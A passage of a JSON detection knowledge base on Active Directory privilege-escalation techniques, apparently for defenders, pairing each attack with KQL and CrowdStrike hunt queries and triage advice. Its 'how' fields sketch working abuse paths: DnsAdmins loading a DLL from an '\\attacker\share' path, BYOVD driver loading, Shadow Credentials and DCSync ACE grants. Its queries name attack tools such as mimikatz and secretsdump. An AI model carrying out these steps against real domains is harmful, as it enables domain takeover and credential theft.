NetExec, PsExec, services.msc相当API","detect":"Detect DC service binPath changes (4697 service install/modify, 7045) and operations by Server Operators. Monitor for an existing service's image path changing to a non-standard binary/cmd/powershell.","events":"4697/7045 (サービス変更・インストール), 4732 (グループ追加), 4672","mitigate":"Keep Server Operators at zero members and manage strictly as Tier0. Audit DC service changes, alert on privileged group membership changes, and verify AdminSDHolder protection.","triage":"On the DC pull 4697 (service install/modify) and 7045, plus 7040 (service config change), and correlate any existing service whose ImagePath/binPath changed to cmd.exe/powershell.exe/a non-standard path with 4732 (add to Server Operators) and 4672. It is black if right after the rewrite a 7036/7040 restart is followed by Sysmon EID1 showing a LocalSystem child (whoami/net/nltest/lsass touch) parented by that service, from an unmanaged account. It is benign when SCCM/config-management or a legitimate patch/app update points binPath at a known signed binary, sourced from the asset-management server with a change ticket. Repointing a DC service binPath to a script interpreter is essentially never legitimate and is high risk.","hunt":[{"plat":"Sentinel","t":"DC service imagePath set/created to non-standard/cmd/powershell (7045/4697) = black / legit MSI install = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (7045, 4697)\n| where Properties has_any (\"cmd.exe\",\"powershell\",\"\\\\Users\\\\\",\"\\\\Temp\\\\\",\"\\\\ProgramData\\\\\",\"\\\\Public\\\\\",\"rundll32\",\"%COMSPEC%\")\n| project TimeGenerated, Computer, SubjectUserName, ServiceName, Properties\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"sc config …binPath= rewrite on DC = malicious / legit service maintenance = benign","q":"event_simpleName=ProcessRollup2 FileName=sc.exe CommandLine=\"*config*\" CommandLine=\"*binpath*\"\n| stats count values(CommandLine) as cmds by ComputerName, UserName, ParentBaseFileName\n| sort - count"},{"plat":"LogScale","t":"New/changed service ImagePath = cmd/powershell/temp path = malicious / vendor binary path = benign","q":"#event_simpleName=CreateService\n| ServiceImagePath=/cmd\\.exe|powershell|pwsh|\\.bat|\\.vbs|rundll32|\\\\temp\\\\|\\\\users\\\\public/i\n| groupBy([ComputerName, ServiceDisplayName, ServiceImagePath], function=count())\n| sort(count, order=desc)"}]},{"name":"Account Operators Abuse","aka":"Account Operators, non-protected user/group manipulation","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1098","cve":"","sev":"High","summary":"Built-in group abuse exploiting Account Operators' ability to create/modify non-protected users and groups, moving laterally and escalating via credential resets and group manipulation.","how":"Account Operators can create/delete non-AdminSDHolder-protected users/groups, reset passwords, and change membership. Take over an account by resetting a target user's password, or add yourself to a controllable delegated group (e.g. one with GPO edit rights) to chain into ACL-based escalation. Protected groups like DA can't be manipulated directly, but non-protected objects leading to them serve as stepping stones.","tools":"net user/group, PowerView, bloodyAD, Set-ADAccountPassword","detect":"Detect password resets by Account Operators (4724) and user/group creation/modification (4720/4728/4732/4738). Monitor member additions to non-protected but effectively powerful delegated groups.","events":"4724 (パスワードリセット), 4720/4738 (ユーザ作成/変更), 4728/4732 (グループ追加)","mitigate":"Keep Account Operators at zero members and use individual custom ACLs for delegation instead. Inventory delegated-group nesting and rights, protect sensitive groups with AdminSDHolder-equivalent measures, and alert on reset/add operations.","triage":"On the DC pull 4724 (password reset), 4720/4738 (user create/modify), and 4728/4732/4756 (group add), filtering where Subject is an Account Operators member and the target is an AdminSDHolder-unprotected but effectively powerful group (GPO-edit/delegated group). It is black when a password reset on an out-of-scope account is followed by a fresh 4624 logon as that account, or when the operator adds itself to a delegated group (4728/4732) and immediately exercises that group's rights (5136/GPO change). It is benign when routine helpdesk/IDM resets and user creations match the expected scope, hours, and ticketing. An Account Operator adding itself or an unmanaged account into a group with a privileged reach path is top priority.","hunt":[{"plat":"Sentinel","t":"one actor bursting 4724 resets plus 4720/4728/4732/4738 changes = Account Operators abuse black / single helpdesk action = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4724, 4720, 4728, 4732, 4738)\n| summarize Ops = make_set(EventID), Targets = make_set(TargetUserName, 30), cnt = count() by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where cnt > 5 and array_length(Ops) >= 2\n| sort by cnt desc"}],"huntcs":[{"plat":"Event Search","t":"net user / Add-ADGroupMember / password reset burst from host = malicious / helpdesk routine = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*net user*/add*\" OR CommandLine=\"*net localgroup*/add*\" OR CommandLine=\"*Add-ADGroupMember*\" OR CommandLine=\"*Set-ADAccountPassword*\" OR CommandLine=\"*New-ADUser*\")\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName\n| sort - count"},{"plat":"Identity Protection","t":"Account Operators pwd reset / user & group changes (4724/4720/4728/4732) is DC-only via IdP","q":"// Falcon Identity Protection detection: Account Operators mass password reset / account & group manipulation (DC 4724/4720/4728/4732). Pivot to attacker-host ProcessRollup2 query above for the tool footprint."}]},{"name":"Print Operators Abuse (SeLoadDriverPrivilege / BYOVD)","aka":"Print Operators, SeLoadDriverPrivilege, BYOVD kernel escalation","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1068","cve":"","sev":"High","summary":"Built-in group abuse exploiting Print Operators' SeLoadDriverPrivilege to load a signed vulnerable driver (BYOVD) and gain local SYSTEM/DC escalation with kernel privileges.","how":"Print Operators hold SeLoadDriverPrivilege and can load user-specified drivers via NtLoadDriver. Load Capcom.sys or another signed vulnerable driver (BYOVD) to achieve arbitrary kernel code execution and SYSTEM escalation. Print Operators are also allowed to log on to DCs, so this can directly yield SYSTEM on a DC.","tools":"EoPLoadDriver, Capcom.sys, その他BYOVDドライバ, SeLoadDriverPrivilege PoC","detect":"Detect SeLoadDriverPrivilege use, loading of non-standard drivers (Sysmon 6 driver load, signature/hash), and loading of known vulnerable drivers. Correlate Print Operators member activity with driver loads.","events":"Sysmon 6 (driver load), 4673/4674 (特権使用), 4732 (グループ追加), 7045","mitigate":"Keep Print Operators at zero members. Enable the Microsoft Vulnerable Driver Blocklist (HVCI/WDAC) to block BYOVD, allow-list driver loading, and separate DC logon rights.","triage":"On the target host/DC pull 4673/4674 (privilege use including SeLoadDriverPrivilege) and Sysmon EID6 (driver load: ImageLoaded/Signature/Hashes), correlating with 4732 (Print Operators add) and the account's logon. It is black if a Print Operators member loads a driver from a non-standard/user-writable directory whose hash matches a known-vulnerable driver (Capcom.sys, LOLDrivers) and is immediately followed by SYSTEM-escalation behavior (new SYSTEM process / lsass touch). It is benign when printer or vendor driver deployment goes through asset management with WHQL signatures from a known distribution path and the privilege use originates from a driver installer. NtLoadDriver from a user-space path with a known-vulnerable-driver hash match is decisive for black.","hunt":[{"plat":"Sentinel","t":"SeLoadDriverPrivilege exercised by a user account (4673/4674) = BYOVD prep black / machine/print subsystem = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4673, 4674)\n| where PrivilegeList has \"SeLoadDriverPrivilege\"\n| where AccountType != \"Machine\" and SubjectUserName !endswith \"$\"\n| summarize cnt = count(), procs = make_set(ProcessName, 10) by Computer, SubjectUserName, PrivilegeList\n| sort by cnt desc"},{"plat":"Sentinel","t":"member added to Print Operators (RID-550) via 4728/4756 = black / approved print-admin delegation = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4732, 4728, 4756)\n| where TargetSid endswith \"-550\" or TargetUserName == \"Print Operators\"\n| project TimeGenerated, Computer, SubjectUserName, MemberName, MemberSid, TargetUserName\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"LogScale","t":"rare driver loaded on very few hosts (BYOVD) = malicious / fleet-wide standard driver = benign","q":"#event_simpleName=DriverLoad\n| groupBy([ImageFileName, SHA256HashData, ComputerName])\n| groupBy([ImageFileName, SHA256HashData], function=count(as=hosts))\n| hosts<3\n| sort(hosts, order=asc)"},{"plat":"Event Search","t":"known vulnerable driver (RTCore64/gdrv/dbutil/…) load = malicious / legit driver = benign","q":"event_simpleName=DriverLoad ImageFileName IN (\"*RTCore64*\",\"*gdrv*\",\"*dbutil*\",\"*iqvw64*\",\"*procexp*\",\"*WinRing0*\",\"*capcom*\",\"*mhyprot*\")\n| stats count dc(ComputerName) as hosts by ImageFileName, SHA256HashData\n| sort - count"}]},{"name":"DnsAdmins Abuse (ServerLevelPluginDll)","aka":"dnscmd /serverlevelplugindll, DNS DLL injection","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1543","cve":"","sev":"High","summary":"A classic privilege escalation where DnsAdmins make the DNS service load an arbitrary DLL via ServerLevelPluginDll, gaining SYSTEM code execution on the DC.","how":"DnsAdmins members can set an arbitrary DLL path on the DNS server with dnscmd <dc> /config /serverlevelplugindll \\\\attacker\\share\\evil.dll; on DNS service (dns.exe, SYSTEM) restart the DLL is loaded and executes code as SYSTEM. DNS often runs on DCs, so this leads directly to DC compromise and domain takeover.","tools":"dnscmd, DNSAdmin-DLL(msfvenom DLL), NetExec, PowerShell (DnsServer module)","detect":"Detect changes to the ServerLevelPluginDll registry/setting, non-standard DLL loads by the DNS service (Sysmon 7), and abnormal child processes of dns.exe. Correlate DnsAdmins member changes with DNS service restarts.","events":"770 (DNS Server log), Sysmon 7 (dns.exe image load), 7040 (サービス状態), レジストリ監査 ServerLevelPluginDll","mitigate":"Keep DnsAdmins at zero/minimized and treat as Tier0. Audit/forbid ServerLevelPluginDll changes, separate DNS from DCs (where possible), and restrict remote dnscmd operations.","triage":"On the DC/DNS server pull audit of the ServerLevelPluginDll registry value (HKLM\\SYSTEM\\...\\DNS\\Parameters), DNS Server log 770, 7040 (DNS service state/restart), and Sysmon EID7 (dns.exe ImageLoad of a non-standard DLL), correlated with DnsAdmins membership changes (4728/4732). It is black if ServerLevelPluginDll points at a UNC path (\\\\attacker\\share) or user-writable local path holding an unsigned DLL, and after a DNS restart dns.exe loads that DLL and spawns an anomalous child (Sysmon EID1). It is benign when a legitimate third-party DNS plugin (IPAM/filtering product) is configured via change ticket with a known-signed DLL at a legitimate local path. Setting serverlevelplugindll via dnscmd is itself rare, so a value pointing at a remote share warrants immediate escalation.","hunt":[{"plat":"MDE","t":"ServerLevelPluginDll value set/rewritten under DNS Parameters = DLL-injection black / empty/unchanged = white","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"\\Services\\DNS\\Parameters\"\n| where RegistryValueName =~ \"ServerLevelPluginDll\"\n| project Timestamp, DeviceName, ActionType, RegistryValueName, RegistryValueData, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine\n| sort by Timestamp desc"},{"plat":"MDE","t":"dns.exe loading a non-standard DLL outside System32/WinSxS = malicious plugin black / standard paths only = white","q":"DeviceImageLoadEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"dns.exe\"\n| where not(FolderPath has @\"\\Windows\\System32\" or FolderPath has @\"\\Windows\\WinSxS\" or FolderPath has @\"\\Windows\\SysWOW64\")\n| project Timestamp, DeviceName, FileName, FolderPath, SHA256\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"dnscmd /serverlevelplugindll DLL registration = malicious / legit plugin use is rare","q":"event_simpleName=ProcessRollup2 FileName=dnscmd.exe CommandLine=\"*serverlevelplugindll*\"\n| stats count values(CommandLine) as cmds by ComputerName, UserName, ParentBaseFileName\n| sort - count"},{"plat":"Event Search","t":"ServerLevelPluginDll registry value set to non-standard DLL = malicious / value absent = benign","q":"event_simpleName=RegSystemConfigValueUpdate RegValueName=\"ServerLevelPluginDll\"\n| stats count by ComputerName, RegObjectName, RegStringValue\n| sort - count"}]},{"name":"Key Admins / Enterprise Key Admins Abuse","aka":"msDS-KeyCredentialLink write on all objects, domain-wide Shadow Credentials","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1556","cve":"","sev":"Critical","summary":"An often-overlooked built-in group: because Key Admins/Enterprise Key Admins can write msDS-KeyCredentialLink on all objects, they can set Shadow Credentials domain-wide and authenticate as any account.","how":"Key Admins (or the forest's Enterprise Key Admins) members can write an attacker's certificate (public key) to the msDS-KeyCredentialLink attribute of any user/computer. Add a KeyCredential with Whisker/pyWhisker, obtain a TGT as that target (including DA/DC) via PKINIT (Pass-the-Certificate), and recover the NT hash for full impersonation.","tools":"Whisker, pyWhisker, Rubeus (asktgt /getcredentials), Certipy (shadow)","detect":"Monitor msDS-KeyCredentialLink attribute changes (5136) across all objects and detect Key Admins/Enterprise Key Admins member changes. Correlate KeyCredential additions to privileged accounts with subsequent PKINIT authentication.","events":"5136 (msDS-KeyCredentialLink変更), 4768 (PKINIT TGT), 4728 (Key Admins=グローバル追加) / 4756 (Enterprise Key Admins=ユニバーサル追加)","mitigate":"Keep Key Admins/Enterprise Key Admins empty and manage as Tier0. Alert on msDS-KeyCredentialLink changes, inventory NGC/KeyCredential where ADCS is unused, and protect privileged accounts.","triage":"On the DC pull 5136 msDS-KeyCredentialLink changes across all users/computers, inspecting the value add and SubjectUserName, and correlate with 4756/4728 (Key Admins/Enterprise Key Admins add). It is black if a KeyCredential added to a privileged object (DA / DC computer) is immediately followed by DC 4768 issuing a PKINIT TGT (Certificate Information present) for that same object from an unmanaged source (Whisker/Certipy shadow, Rubeus asktgt /getcredentials). It is benign when Windows Hello for Business or device registration (AAD/Intune) writes the KeyCredentialLink for the user's own credential from the enrollment service, with PKINIT from the user's own device. A Key Admin writing a KeyCredential onto someone else's privileged object is textbook Shadow Credentials and is black-priority.","hunt":[{"plat":"Sentinel","t":"value added to msDS-KeyCredentialLink on any object (5136) = Shadow Credentials black / genuine WHfB enrollment = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, ObjectType, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"member added to Key Admins/Enterprise Key Admins (RID-526/-527) via 4728/4756 = domain-wide Shadow-Creds power black / none = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4728, 4756)\n| where TargetSid endswith \"-526\" or TargetSid endswith \"-527\" or TargetUserName in (\"Key Admins\",\"Enterprise Key Admins\")\n| project TimeGenerated, Computer, SubjectUserName, MemberName, MemberSid, TargetUserName\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"Whisker/DSInternals msDS-KeyCredentialLink write on host = malicious / legit WHfB enroll = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Whisker*\" OR CommandLine=\"*msDS-KeyCredentialLink*\" OR CommandLine=\"*DSInternals*\" OR CommandLine=\"*Set-ADComputer*KeyCredential*\" OR CommandLine=\"*pywhisker*\")\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName\n| sort - count"},{"plat":"Identity Protection","t":"domain-wide msDS-KeyCredentialLink write (5136) + PKINIT (4768) is DC-only via IdP; correlate host tool","q":"// Falcon Identity Protection detection: Shadow Credentials (msDS-KeyCredentialLink write) & Key Admins membership change (DC 5136/4768/4732/4756). No attacker-host DC-view in EDR; pivot to ProcessRollup2 above."}]},{"name":"Exchange Privilege Escalation (WriteDACL to Domain)","aka":"Exchange Windows Permissions, PrivExchange (non-relay), CVE-2019-0724","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1098","cve":"","sev":"Critical","summary":"Abuses the excessive ACL granted by an Exchange install (Exchange Windows Permissions' WriteDACL on the domain object) to grant oneself DCSync rights and take over the domain.","how":"The Exchange Windows Permissions group holds WriteDACL on the domain object, so controlling that group (or Exchange Trusted Subsystem) lets you add a Replicating Directory Changes/All (DCSync) ACE for your account to the domain root DACL. Then use secretsdump/DCSync to obtain all hashes (krbtgt) and dominate the domain. Unlike the relay-based PrivExchange, this works as an ACL abuse.","tools":"PowerView (Add-DomainObjectAcl), impacket-dacledit, aclpwn, ntdsutil/secretsdump","detect":"Detect ACE additions to the domain root DACL, especially granting DS-Replication-Get-Changes-family ACEs (5136 nTSecurityDescriptor change). Correlate Exchange-related group member/ACL changes with immediate DCSync (4662).","events":"5136 (nTSecurityDescriptor / DCSync ACE), 4662 (Replication権限使用), 4732","mitigate":"Adopt the Exchange split-permission model and reduce Exchange Windows Permissions' domain WriteDACL (apply MS mitigation guidance). Audit domain root DACL changes and protect Exchange servers/groups as Tier0.","triage":"On the DC pull domain-root nTSecurityDescriptor changes (5136, ACE added to the DACL for DS-Replication-Get-Changes / -Get-Changes-All GUIDs), inspecting the trustee SID, the source, and Exchange Windows Permissions/Exchange Trusted Subsystem membership/ACL changes (4732). It is black if a DCSync ACE granted to a non-admin account at the domain root is immediately followed by 4662 for that account accessing the Replicating Directory Changes property GUIDs (1131f6aa/1131f6ad) = DCSync executed. It is benign when Exchange schema extension/setup or a CU updates the DACL, sourced from the Exchange setup account within a maintenance window, with no DCSync ACE landing on a human account. A new DS-Replication ACE at the domain root is a top-priority immediate alert.","hunt":[{"plat":"Sentinel","t":"5136 nTSecurityDescriptor change adding DS-Replication-Get-Changes ACE GUIDs = DCSync-rights grant black / normal ACL = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"nTSecurityDescriptor\"\n| where Properties has_any (\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\",\"89e95b76-444d-4c62-991a-0facbeda640c\")\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, ObjectType, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"non-DC user account with 4662 carrying replication GUIDs = DCSync execution black / DC-to-DC replication = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\")\n| where Account !endswith \"$\" and AccountType == \"User\"\n| summarize cnt = count() by Account, Computer, bin(TimeGenerated, 1h)\n| where cnt > 0\n| sort by cnt desc"}],"huntcs":[{"plat":"Event Search","t":"WriteDACL/DCSync tooling (dacledit/aclpwn/secretsdump/GetChangesAll) on host = malicious / DC-to-DC repl = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Add-DomainObjectAcl*\" OR CommandLine=\"*aclpwn*\" OR CommandLine=\"*dacledit*\" OR CommandLine=\"*GetChangesAll*\" OR CommandLine=\"*secretsdump*\" OR CommandLine=\"*dcsync*\")\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName\n| sort - count"},{"plat":"LogScale","t":"non-DC host connecting to DC:445 for replication (DCSync) = malicious / DC-to-DC replication = benign","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=445\n| ContextBaseFileName=/powershell|pwsh|python|secretsdump|mimikatz|rundll32/i\n| groupBy([ComputerName, ContextBaseFileName, RemoteAddressIP4], function=count())\n| sort(count, order=desc)"}]},{"name":"Delegated Group Abuse (Cert Publishers / DHCP Admins / GPCO)","aka":"Cert Publishers, DHCP Administrators, Group Policy Creator Owners abuse","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1098","cve":"","sev":"High","summary":"A cluster of escalation/persistence paths abusing the rights of often-overlooked built-in/delegated groups (Cert Publishers, DHCP Administrators, Group Policy Creator Owners, etc.).","how":"Group Policy Creator Owners can create new GPOs; combined with link rights, deploy immediate tasks to endpoints under an OU for lateral movement. DHCP Administrators can manipulate DHCP/DNS dynamic-update settings, leading to name-resolution tampering. Cert Publishers may be involved in writing userCertificate on computer objects. Each builds a privilege path from an underestimated delegated group.","tools":"PowerView, GPOwned/SharpGPOAbuse, bloodyAD, netsh dhcp","detect":"Detect member changes to these delegated groups (4728/4732/4756) and GPO creation or DHCP/DNS setting changes using their rights. Periodically assess each group's effective reach (Outbound Control) with BloodHound.","events":"4728/4732/4756 (グループ追加), 5136 (GPO/ACL変更), 5137 (GPOオブジェクト作成)","mitigate":"Inventory and minimize members of each delegated group and limit GPO create/link rights of Group Policy Creator Owners and similar. Visualize attack paths with BloodHound, remove excessive delegation, and alert on changes.","triage":"On the DC pull 4728/4732/4756 (adds to Group Policy Creator Owners / DHCP Administrators / Cert Publishers), then correlate subsequent GPO creation (5137), GPO/ACL changes (5136 gPCFileSysPath/versionNumber), DHCP/DNS config changes, and userCertificate writes with the added member. It is black if a GPCO member creates a new GPO and links it to an OU then pushes a SYSTEM command via immediate task, or a DHCP Admin tampers with DNS dynamic updates to hijack name resolution, from an unmanaged account matching a BloodHound reach path. It is benign when the GPO/DHCP operations team makes routine membership/config changes consistent with tickets, known operations hosts, and expected OU scope. Corroborate new adds to these underrated delegated groups by periodically re-evaluating Outbound Control in BloodHound.","hunt":[{"plat":"Sentinel","t":"Unexpected member added to Cert Publishers/DHCP Administrators/GPCO = black / approved operator change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4728, 4732, 4756)\n| where TargetUserName in~ (\"Cert Publishers\", \"DHCP Administrators\", \"Group Policy Creator Owners\")\n| project TimeGenerated, EventID, DelegatedGroup=TargetUserName, MemberName, MemberSid, Actor=SubjectUserName, Computer\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"New GPO / gPCFileSysPath change made via delegated group rights = black / normal GPO admin edits = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5136, 5137)\n| where Properties has_any (\"gPCFileSysPath\", \"gPCMachineExtensionNames\", \"gPLink\")\n| summarize changes=count(), objs=make_set(ObjectName, 10) by Actor=SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where changes > 2\n| sort by changes desc"}],"huntcs":[{"plat":"Event Search","t":"Member-add commands targeting delegated groups (Cert Publishers/DHCP Admins/GPCO)=black / planned IT ops=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Cert Publishers*\" OR CommandLine=\"*DHCP Admin*\" OR CommandLine=\"*Group Policy Creator Owners*\") (CommandLine=\"*group*/add*\" OR CommandLine=\"*Add-ADGroupMember*\" OR CommandLine=\"*net localgroup*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"DC-side 4728/4732/4756 not seen by EDR; delegated privileged-group membership change via Identity Protection","q":"// Falcon Identity Protection detection: privileged/delegated group membership change (Cert Publishers / DHCP Administrators / Group Policy Creator Owners) + BloodHound Outbound Control review"}]},{"name":"Schema Admins / defaultSecurityDescriptor Abuse","aka":"schema class defaultSecurityDescriptor tampering, permanent backdoor ACE","phase":"dominance","group":"Dominance & Persistence","mitre":"T1098","cve":"","sev":"Critical","summary":"An advanced domain-domination/persistence technique that tampers with a schema class's defaultSecurityDescriptor to plant a permanent backdoor ACE on all future-created objects.","how":"With Schema Admins rights, rewrite a schema class's (e.g. user, computer) defaultSecurityDescriptor to embed a FullControl/GenericAll ACE for the attacker SID. Thereafter all new objects created from that class inherit the attacker-controlled ACE, forming a long-term persistence backdoor that recovers control via new objects even after patching or permission resets. Schema changes affect the entire forest and are highly irreversible.","tools":"ldapmodify, ADSI Edit, PowerShell (Set-ADObject on schema)","detect":"Treat defaultSecurityDescriptor changes on schema NC objects (5136) and Schema Admins member changes as top-priority events. Periodically audit for suspicious ACEs common across newly created objects.","events":"5136 (schema defaultSecurityDescriptor変更), 4756/4728 (Schema Admins追加), 4662","mitigate":"Keep Schema Admins empty and operate with temporary additions only when changes are needed. Alert on schema NC changes, periodically baseline-compare defaultSecurityDescriptor, and manage strictly as Tier0.","triage":"On the DC audit changes to defaultSecurityDescriptor on classSchema objects under the Schema NC (CN=Schema,CN=Configuration) via 5136 as a top-priority signal, correlated with 4756/4728 (Schema Admins add) and 4662. It is black if the defaultSecurityDescriptor SDDL embeds a FullControl/GenericAll ACE for an attacker SID, sourced from an unmanaged account (ldapmodify/ADSI Edit), and newly created objects of that class subsequently inherit the same suspicious ACE. It is benign when a schema extension (Exchange/SCCM/legitimate app) uses a ticketed temporary Schema Admins elevation in a maintenance window from a known vendor LDIF, granting to SYSTEM/legitimate groups. Because schema changes affect the whole forest irreversibly, any defaultSecurityDescriptor ACE granted to a human SID is unconditionally escalated.","hunt":[{"plat":"Sentinel","t":"Change to schema defaultSecurityDescriptor (5136) = persistent-ACE backdoor, black / schema edits are extremely rare = default white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"defaultSecurityDescriptor\"\n| project TimeGenerated, Actor=SubjectUserName, ObjectName, ObjectClass=ObjectType, OperationType, Properties, Computer\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Member added to Schema Admins (4756/4728) = dominance precursor, black / temporary add during a schema-extension project = white (verify)","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4756, 4728)\n| where TargetUserName =~ \"Schema Admins\"\n| project TimeGenerated, EventID, MemberName, MemberSid, Actor=SubjectUserName, Computer\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"Tooling editing Schema NC defaultSecurityDescriptor/ACE=black / legit schema extension is very rare=scrutinize","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*defaultSecurityDescriptor*\" OR (CommandLine=\"*CN=Schema*\" AND CommandLine=\"*Set-ADObject*\") OR (CommandLine=\"*ldifde*\" AND CommandLine=\"*Schema*\") OR CommandLine=\"*schemaNamingContext*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"5136 schema change / Schema Admins add is DC-only; monitor persistent-ACE backdoor via Identity Protection","q":"// Falcon Identity Protection detection: Schema Admins membership change + schema object defaultSecurityDescriptor modification (persistent inherited ACE)"}]},{"name":"GPO Immediate Scheduled Task / Restricted Groups Abuse","aka":"GPO immediate task deployment, Restricted Groups forced local-admin addition, SharpGPOAbuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1484.001","cve":"","sev":"High","summary":"A concrete vector abusing edit rights on an existing GPO to deploy an immediate scheduled task or force a local admin addition via Restricted Groups, achieving code execution and persistence on downstream endpoints.","how":"With write access to a GPO, use SharpGPOAbuse to add an Immediate Scheduled Task to the GPP, running SYSTEM/user commands on all endpoints under the linked OU. Or use Restricted Groups/GPP Local Users and Groups to force the attacker account into each endpoint's local Administrators for lateral movement and persistence.","tools":"SharpGPOAbuse, pyGPOAbuse, PowerView (GPO ACL), GPOwned","detect":"Detect changes to GPOs (especially SYSVOL ScheduledTasks.xml/Groups.xml) (5136/5145 SYSVOL write) and gptmpl/GPP additions. On clients, monitor gpsvc-triggered immediate task execution and local Administrators additions (4732 local).","events":"5136 (versionNumber/gPCFileSysPath), 5145 (SYSVOL書込), 4732 (ローカルAdmin追加), Sysmon 1","mitigate":"Minimize GPO edit/link rights and alert on GPO changes. Perform SYSVOL integrity monitoring, baseline Restricted Groups, and inventory write ACLs on critical GPOs.","triage":"On the DC pull SYSVOL GPO file writes, especially to ScheduledTasks.xml/Groups.xml, via 5145 (Share = SYSVOL/NETLOGON, RelativeTargetName ScheduledTasks.xml/Groups.xml) and 5136 (versionNumber/gPCFileSysPath), correlated with the writing principal and source. It is black if a SharpGPOAbuse/pyGPOAbuse-style Immediate Task is added and, across many linked-OU clients in a short window, gpsvc executes it (Sysmon EID1 SYSTEM child) or a local Administrators add lands (client 4732 local) via Restricted Groups/GPP. It is benign when the GPO team updates ScheduledTasks/Groups as legitimate patch/config distribution from a known admin host via GPMC with a change ticket. A direct SYSVOL file write that bypasses GPMC and comes from a suspicious account is black-priority.","hunt":[{"plat":"Sentinel","t":"Write to SYSVOL ScheduledTasks.xml/Groups.xml/GptTmpl.inf (5145) = SharpGPOAbuse-style black / legit edit via GPMC = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has \"SYSVOL\"\n| where RelativeTargetName has_any (\"ScheduledTasks.xml\", \"Groups.xml\", \"GptTmpl.inf\", \"ScheduledTasks\")\n| where AccessMask has_any (\"0x2\", \"0x4\", \"0x100\", \"0x116\")\n| project TimeGenerated, Account, IpAddress, RelativeTargetName, AccessMask, Computer\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Local Administrators add (4732) fanning out across member servers after GPO push = black / one-off manual add = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4732\n| where TargetUserName in~ (\"Administrators\", \"Administrateurs\")\n| summarize hosts=dcount(Computer), computers=make_set(Computer, 15) by MemberSid, bin(TimeGenerated, 1h)\n| where hosts > 2\n| sort by hosts desc"}],"huntcs":[{"plat":"Event Search","t":"SharpGPOAbuse / immediate-task (ScheduledTasks.xml) injection into SYSVOL=black / legit GPMC edit=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*SharpGPOAbuse*\" OR CommandLine=\"*ScheduledTasks.xml*\" OR CommandLine=\"*--AddComputerTask*\" OR CommandLine=\"*--AddUserTask*\" OR CommandLine=\"*--AddLocalAdmin*\" OR CommandLine=\"*New-GPImmediateTask*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"LogScale","t":"On clients, gpsvc(svchost)-spawned cmd/powershell immediate exec=GPO-pushed black / normal gpupdate=white","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/^svchost\\.exe$/i\n| FileName=/^(cmd|powershell|wscript|cscript)\\.exe$/i\n| CommandLine=/net localgroup administrators .* \\/add|Invoke|DownloadString|-enc/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())"}]},{"name":"Pass-the-Certificate (PKINIT / Schannel)","aka":"TGT acquisition via PKINIT, PFX authentication, LDAPS certificate authentication","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1550","cve":"","sev":"High","summary":"A lateral-movement technique using a PFX/certificate obtained by theft or via Shadow Credentials/ADCS to acquire a TGT via PKINIT and authenticate to LDAPS via Schannel (an independent technique focused on authentication use).","how":"Using a user/computer certificate (PFX) obtained via 